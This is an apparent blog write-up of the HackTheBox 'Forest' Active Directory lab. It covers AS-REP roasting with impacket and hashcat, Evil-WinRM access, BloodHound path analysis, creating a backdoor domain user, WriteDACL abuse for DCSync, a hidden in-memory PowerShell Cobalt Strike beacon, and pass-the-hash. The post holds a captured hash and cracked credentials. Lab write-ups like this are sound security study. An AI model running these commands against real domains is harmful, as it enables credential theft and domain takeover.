---
title: "HackTheBox: Forest"
date: 2025-03-03T09:00:00+02:00
draft: false
author: "Anthony Tuff"
cover:
image: /img/forest/manager.png   ins
# alt: 'This is an alt tag for You Are Here picture'
# caption: 'This is a caption for the image. You are not lost.'
tags: ["Forest-hackthebox","windows","hackthebox-walktrough","htb","privilege escacation"]
categories: ["hackthebox","windows","boot2root","tech"]
---


![](/img/Forest/Pasted%20image%2020250301214344.png)
#  Overview
Well I first compromised this box back in 2020, and looking back, time really flies. However, I decided to revisit it due to its unique privilege escalation vector, particularly involving Discretionary Access Control Lists (DACL). 

I recently encountered a similar  technique in an active box I was working on, which made me want to take a closer look at some of the concepts IppSec demonstrated—going beyond root. Also it's  in my checklist  in line with my preparation for the Certified Red Team Operator (CRTO) exam. And why not , I can do a blog post for it.

This time, I'm gone take a slightly different approach.- Going a little  deeper with  Bloodhound enumeration, focusing on elements that are often overlooked during typical assessments or Domain recon. Understanding how to properly translate pieces  is critical for real-world engagements.


Another key objective is to play around with Cobalt Strike(CS), particularly in stabilizing a shell, establishing persistence, and moving laterally within the an environment. Gaining hands-on experience with these techniques is essential for red teaming engagements.

** In my future blogposts, We will explore memory evasion and Windows-based evasion techniques with CS,  so stay tuned!


## 🔍 Information Gathering

As always, the first step in any assessment is situational awareness, which starts at the ** humble terminal**. To identify potential entry points, I ran an Nmap scan using:
```
nmap -sV -A -sC --min-rate=1000 10.10.10.161
```
Based on the results we note the following;

| **Port** | **Service**           | **Potential Attack Surface**                                                                                                 |
| -------- | --------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| **53**   | DNS (Simple DNS Plus) | Possible DNS zone transfer attack (`AXFR`) to enumerate subdomains.                                                          |
| **88**   | Kerberos              | ASREPRoasting (if accounts don’t require pre-authentication), Kerberoasting (if weak service account passwords exist).       |
| **135**  | MSRPC                 | Could be used for remote procedure calls (RPC), often leveraged for DCSync attacks if misconfigured.                         |
| **139**  | NetBIOS-SSN           | Could reveal NetBIOS names, possibly aiding in SMB attacks or username enumeration.                                          |
| **389**  | LDAP                  | Allows for LDAP enumeration, identifying users, groups, and policies. Can be useful for LAPS and misconfigured ACL exploits. |
| **445**  | SMB                   | Potential SMB relay, anonymous access, password spraying, and LPE (Local Privilege Escalation) via misconfigured shares.     |
| **464**  | kpasswd               | Might be used for password changes, could be abused if weak password policies exist.                                         |
| **593**  | RPC over HTTP         | Potential for coercing authentication via PetitPotam or NTLM relay attacks.                                                  |
| **636**  | Secure LDAP (LDAPS)   | If weak certificate configurations exist, MITM attacks could be possible.                                                    |
| **3268** | Global Catalog (LDAP) | Useful for enumerating domain users, groups, and trust relationships. LDAP anonymous checks                                  |
| **3269** | Secure Global Catalog | If misconfigured, could expose sensitive information.                                                                        |
| **5985** | WinRM                 | If valid credentials are obtained, Remote Command Execution is possible via Evil-WinRM.                                      |

###### Scanning through Nmap
![](/img/Forest/Pasted%20image%2020250301215039.png)
From the results, we can now update our **`/etc/hosts`** file to include the domain name, which will allow us to resolve Forest.htb.local properly.
```
echo "10.10.10.161  forest.htb.local" | sudo tee -a /etc/hosts

```
Since Kerberos authentication is enabled, we need to ensure our attack machine’s clock is synchronized with the target. Kerberos relies on time-sensitive tokens, and even a slight clock skew can break authentication, triggering unnecessary  failure of our commands.
```
sudo ntpdate -u forest.htb.local
```

With that out of the way, it's  time to hunt for some users and enumerate  potential  AD misconfigurations, we can abuse. I decided to fire up Ker brute and enum4linux, good solid tools for enumerating domain  and discovering if there are any misconfigured services.

Firstly, I ran Kerbrute to brute-force the user enumeration process against the *HTB.local* domain. It's actually a good starting since it doesn’t lock out accounts when probing usernames, making it a stealthy way to confirm valid user accounts.
```
./kerbrute_linux_amd64 userenum -d htb.local /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.161 -t 200
```
From the results,  we are able to extract a list of domain users as shown below
![](/img/Forest/Pasted%20image%2020250301220830.png)

```
impacket-GetNPUsers htb.local/ -no-pass -usersfile lower_users.txt -dc-ip 10.10.10.161
```
## Enumeration

Next, I ran enum4linux to gather additional intel about the domain, particularly users, groups, and shares. Reviewing the results, I noticed something interesting: Always worth in adding it in your Internal VAPT finding.

> **The RPC client was misconfigured and did not require authentication.**

This a common AD misconfiguration, as it allowed me to extract valuable information about; Domain users, Group memberships, Shared folders & permissions and Potentially sensitive information stored in descriptions as shown below; 
```
enum4linux -a 10.10.10.161
```
![](/img/Forest/Pasted%20image%2020250301230855.png)
![](/img/Forest/Pasted%20image%2020250301230946.png)

![](/img/Forest/Pasted%20image%2020250301231041.png)
![](/img/Forest/Pasted%20image%2020250301231139.png)
⚠️ For Sysadmins reading this- This is a goldmine for attackers, as it can expose privileged accounts, domain users,  misconfigured groups, or potential password reuse scenarios if any. Additionally, it provides a blueprint of the domain’s organizational structure, allowing a threat actor to plan an attack with a greater precision.
```
rpcclient -U '' -N 10.10.10.161
```
![](/img/Forest/Pasted%20image%2020250301224054.png)
Since `rpcclient` produced more valid results than Kerbrute (which can sometimes yield false positives), I compiled a clean list of valid domain users and checked  to see if there any accounts vulnerable to an AS-REP Roasting attack.
##### **What is AS-REP Roasting?**
Certain user accounts in Active Directory  have UF_DONT_REQUIRE_PREAUTH flag set, meaning they don’t require Kerberos pre-authentication.Pre-authentication is the initial stage of Kerberos authentication, which is managed by the KDC Authentication server and is meant to prevent brute-force attacks. If an account has this misconfiguration, we can request a TGT (Ticket Granting Ticket) without credentials and attempt to crack the hash offline. We use the famous impacket library.
```
impacket-GetNPUsers htb.local/ -no-pass -usersfile domainusers.txt -dc-ip 10.10.10.161
```
![](/img/Forest/Pasted%20image%2020250301224241.png)
![](/img/Forest/Pasted%20image%2020250301223305.png)
Bingo! The account  svc-alfresco@HTB.LOCAL was flagged as vulnerable:
> **svc-alfresco** has `UF_DONT_REQUIRE_PREAUTH` set, making it susceptible to an **AS-REP Roasting attack**.

With the AS-REP hash obtained, we can now do offline password cracked offline and obtain plaintext password. For this we can use hashcat to attempt cracking it with the rockyou wordlist:
```
vi hash.txt
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --force
```
![](/img/Forest/Pasted%20image%2020250301224649.png)
```
$krb5asrep$23$svc-alfresco@HTB.LOCAL:2a17f2e1db3be277b386f3770e886f23$89e51f3c7b6bd1b38e5d7530eaeec845500deb9867bdc0acd3a192048fabcb5da675db50e8a92a1a22e698cd3f2e365fb5b7fad3945730bb946393c4bfc95039f45f88f5e1cd506a973d64980ea8eca6aa6696e938d365ebb493bebea87e1949c3340f2841771765f94f925400e170dceb3daf6a78f9b4622c0b1e138798a5c4c808bcd1946c716e84c6a36e7b47122b42f635d908274baa5bf2045d78dd9275e6d25bbff52f0e6e8a15337fedfb3adbd01a4a3008b53f3c6a13e686688964bff35612e9f25a28fa957745e7564e5a79b49a3c19fba5890ad80e8d373ecc04a9186572e4f911:s3rvice
```
![](/img/Forest/Pasted%20image%2020250301224934.png)
### Intial FootHold
After few minutes we  successfully crack the password (`s3rvice`), and now have a valid domain credentials. This opens the door to a whole range of attack vectors, including authenticated scanning, enumeration, and lateral movement.
Before jumping into exploitation, let's  confirm  the credentials using netexec.
```
netexec smb 10.10.10.161 -u svc-alfresco -p 's3rvice'
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\svc-alfresco:s3rvice
```
With everything checked out—credentials are solid! Now, let's move on to Evil-WinRM, a powerful tool for interacting with Windows systems over WinRM (Windows Remote Management).
![](/img/Forest/Pasted%20image%2020250301225117.png)

We now have a fully interactive shell on the target using Evil-WinRM. Let's grab the user.txt.  Now lets' find the privilege escalation points -finding a way to move from a low-privileged user to SYSTEM or domain admin.
![](/img/Forest/Pasted%20image%2020250301225729.png)
The first basic enumeration we can do from this point is to gather intel about the host. We can the check the user privileges and groups they belongs to.
```
whoami /priv
whoami /groups
net user svc-alfresco /domain
```
![](/img/Forest/Pasted%20image%2020250304084420.png)

What I noted the user has no direct high-privilege rights, Key thing also to note is the user is in Privileged IT Accounts and Service Accounts group, this could be interesting if these groups have special privileges in the domain. On that note , let's run bloodhound to gather insights  about the domain. 
```
ldapdomaindump ldap://10.10.10.161 -u "htb.local\svc-alfresco" -p s3rvice -o ./
```
![](/img/Forest/Pasted%20image%2020250302005705.png)

![](/img/Forest/Pasted%20image%2020250302005706.png)


Bloodhound.
```
bloodhound-python -u svc-alfresco -p 's3rvice' -c All -d htb.local -ns 10.10.10.161 -o data.zip
```

![](/img/Forest/Pasted%20image%2020250301232433.png)
After running BloodHound-python or your preferred ingestor such as sharp hound, you’ll notice multiple JSON files generated in the  current directory. Once you import these into bloodHound, an extensive number of graphs and relationships between domain objects will be displayed. At first glance, this can be overwhelming, as there’s a lot of information to process.

So, how do we make sense of all this?

##### BloodHound for Red Teaming & Blue Teaming
Before diving into the analaysis, let’s briefly cover few concepts of  bloodHound  and it's applicability to both red teams and blue teams.

Red Teams (Attackers) use BloodHound to map attack paths, identify privilege escalation vectors, and uncover hidden relationships between domain objects that could lead to Domain Admin (DA) access or some sort of privilege account.
Blue Teams (Defenders) leverage BloodHound to analyze security gaps, detect misconfigurations, and implement remediation strategies to block potential attack paths before an attacker exploits them.


It just reminds me of a common saying “Defenders think in lists. Attackers think in graphs"  



###### Key Questions to Ask When Analyzing BloodHound Data
To effectively use BloodHound, always keep these guiding questions in mind:
1️⃣ **What is my goal?** → Am I looking for a path to escalate privileges, lateral movement, or domain dominance?  
2️⃣ **Who has control over what?** → Which accounts have privileged access or administrative rights?  
3️⃣ **What permissions are misconfigured?** → Look for WriteDACL, GenericWrite, or Owns attributes on objects.  
4️⃣ **What attack paths exist?** → Can I abuse ACLs, AS-REP roastingKerberoastable accounts, or constrained delegation?  
5️⃣ **Can I move laterally?** → Are there sessions, local admin access, or delegation settings that I can exploit?

By answering these questions, you can narrow down your focus and find the shortest path to privilege escalation.

##### Top 10 BloodHound Attributes & Their Exploitation Potential
Understanding key attributes in Bloodhound is crucial for recognizing privilege escalation paths. Below are the top 10 attributes to look out for and how they can be exploited, It also depends what you are looking for/

| **Attribute**       | **Usage & Exploitation**                                                                                                       |
| ------------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| AdminTo             | Identifies users/groups with admin rights over specific machines. **Exploit:** Lateral movement using compromised credentials. |
| CanRDP              | Users with Remote Desktop access to systems. **Exploit:** Direct RDP access after credential compromise.                       |
| CanPSRemote         | Users with PowerShell Remoting access. **Exploit:** Remote command execution via WinRM.                                        |
| ExecuteDCOM         | Users who can execute commands remotely via DCOM. **Exploit:** Remote code execution and lateral movement.                     |
| AllowedToDelegateTo | Indicates delegation settings on an account. **Exploit:** Abuse **Kerberos delegation** for privilege escalation.              |
| WriteDACL           | The user can modify permissions on an object. **Exploit:** Modify ACLs to grant themselves full control.                       |
| GenericWrite        | The user has write access to an object. **Exploit:** Modify group memberships or user attributes for privilege escalation.     |
| Owns                | The user fully owns an object. **Exploit:** Modify the object’s permissions to grant themselves higher privileges.             |
| HasSession          | Shows active user sessions on a machine. **Exploit:** Hijack an active session to move laterally.                              |
| TrustedBy           | Indicates **trust relationships** between domains. **Exploit:** Abuse trust misconfigurations to escalate privileges.          |
Well let me stop there for now, may a separate post for this will help.
![](/img/Forest/Pasted%20image%2020250301233135.png)

 A good starting point for BloodHound analysis is to focus on the account we already have access to—in this case, svc-alfresco. Since we already "own" this account, we need to trace its relationships and see if it connects to any privileged groups that can lead us to higher access (eventually reaching Domain Admin).
![](/img/Forest/Pasted%20image%2020250301233833.png)
As illustrates in the picture below, this the chain of relationships.

Let’s break it down step by step:
- svc-alfresco is a member of the Service Accounts group.
- Service Accounts is a member of the Privileged IT Accounts group.
- Privileged IT Accounts is a member of the Account Operators group.
- Account Operators has GenericAll permissions on the Exchange Windows Permissions group.
- Exchange Windows Permissions has WriteDACL permissions on the domain itself.
![](/img/Forest/Pasted%20image%2020250302000500.png)

![](/img/Forest/Pasted%20image%2020250302162920.png)
![](/img/Forest/Pasted%20image%2020250302004527.png)
This means we can add our Membership to the “Exchange Windows Permissions” group
![](/img/Forest/Pasted%20image%2020250302170245.png)
Let's put the attack path into action and go full offensive mode. We will chain multiple steps and completely own this network. 💀


<br>
**Step 1: Create a New User**  
Since svc-alfresco is a member of Account Operators, we can create a new domain user(sploit). This is can somehow act us our  backdoor account.
```
net user sploit password /add /domain
```
**Step 2: Add the User to the Exchange Windows Permissions Group**  
We now escalate our new user’s privileges by adding them to the Exchange Windows Permissions group. This step is critical because this group has dangerous control over the entire domain.
```
net group "Exchange Windows Permissions"
```
**Step 3: Abuse WriteDACL to Get DcSync Privileges** -
Since the Exchange Windows Permissions group has WriteDACL over the domain, we can now modify Active Directory permissions to grant our new user the Replicating Directory Changes privilege (a.k.a. DcSync power). For this I wil go the cobalt strike way.
💡 Why is this important?  
Because DcSync allows us to pull password hashes from ANY user in Active Directory, including the Administrator.

![](/img/Forest/Pasted%20image%2020250302165612.png)

## Privilege Escalation
##### **Cobalt Strike Perspective**
After setting up the attack path, I decided to explore Cobalt Strike for performing DC Sync actions. This provides a different approach, offering flexibility in post-exploitation and lateral movement. Using Cobalt Strike, we can execute a DC Sync attack, extract hashes, and then pivot to pass-the-hash for DA access. It's actually  clean just for us to have a feel of a real-world adversary simulation experience.
######  Concepts
- ***Beacon*** – This is the payload used for executing commands post-exploitation.
- ***Post-Exploitation & Lateral Movement*** – Cobalt Strike provides a stealthy interface for pivoting across the network, running commands asynchronously or in real time.

Starting Team server: 
![](/img/Forest/Pasted%20image%2020250302171604.png)
Creating a listener
![](/img/Forest/Pasted%20image%2020250302172012.png)

![](/img/Forest/Pasted%20image%2020250302172714.png)


uploading the Stager
![](/img/Forest/Pasted%20image%2020250302173211.png)

Load and Execute the Script in Memory- so as to get a beacon to our Cobalt strike
```
powershell -ep bypass -nop -w hidden -c "IEX (Get-Content .\beacon_x64.ps1 | Out-String)"

***Explanation:***
- `IEX` (Invoke-Expression) runs the script in memory.
- `Get-Content` reads the script without executing it from disk.
- `-nop` (NoProfile) avoids loading unnecessary PowerShell modules.
- `-w hidden` keeps the PowerShell window hidden for stealth.
```
![](/img/Forest/Pasted%20image%2020250302173350.png)
We now have a beacon on hosts.
![](/img/Forest/Pasted%20image%2020250302173414.png)
Illustting posisble thing we can do once we have a beacon. I guess I will cover in details in other post for now  just enjoy yhe screenshot for those who are new.
![](/img/Forest/Pasted%20image%2020250302173656.png)
![](/img/Forest/Pasted%20image%2020250302175258.png)
![](/img/Forest/Pasted%20image%2020250302180121.png)

![](/img/Forest/Pasted%20image%2020250302180349.png)
Privilege Escalation 
Using Cobalt Strike, I modified Active Directory ACLs to give full control to the user `sploit`:This technique  leverages **R**esource-Based Constrained Delegation (RBCD) abuse or ACL abuse to escalate privileges****
```
powershell Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity sploit -Rights All
make_token sploit password- 
dcsync htb.local htb\Administrator
make_token Administrator htb.local 32693b11e6aa90eb43d32c72a07ceea6
```

- **DCSync Attack** – Using Mimikatz’s `lsadump::dcsync` module, we mimic a **Domain Controller** and extract all password hashes from Active Directory.

![](/img/Forest/Pasted%20image%2020250302225055.png)

![](/img/Forest/Pasted%20image%2020250302203214.png)

```
make_token Administrator htb.local 32693b11e6aa90eb43d32c72a07ceea6
```
![](/img/Forest/Pasted%20image%2020250303212822.png)
![](/img/Forest/Pasted%20image%2020250303201318.png)
**Pass-the-Hash Attack** – With the extracted NTLM hashes, we can now authenticate as the **Administrator** without knowing the actual password. We can grab our user.txt

![](/img/Forest/Pasted%20image%2020250303211749.png)

## 📜 Conclusion
### Key Takeways Include
1. BloodHound is a game-changer for mapping attack paths and privilege escalation routes in Active Directory.
2. Abusing Active Directory ACLs and DCSync Abuse
3. ASREPRoasting  attack
4. Cobalt Strike Aggressor Scripts & Common Commands
5. OPSEC concepts


# References & Suggested Reading:
https://rioasmara.com/2023/11/26/user-impersonation-with-cobaltstrike/
https://github.com/fox-it/Invoke-ACLPwn
https://github.com/dirkjanm/ldapdomaindump